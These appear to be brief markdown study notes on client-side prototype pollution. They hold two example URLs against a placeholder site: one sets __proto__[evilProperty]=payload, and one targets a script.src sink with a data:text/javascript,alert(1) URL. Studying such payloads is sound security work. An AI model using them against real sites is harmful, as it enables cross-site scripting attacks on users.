---
tags:
  - web
  - security
---
```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```
# For script.src Sink
```
https://vulnerable-website.com/?__proto__[evilProperty]=data:text/javascript,alert(1)
```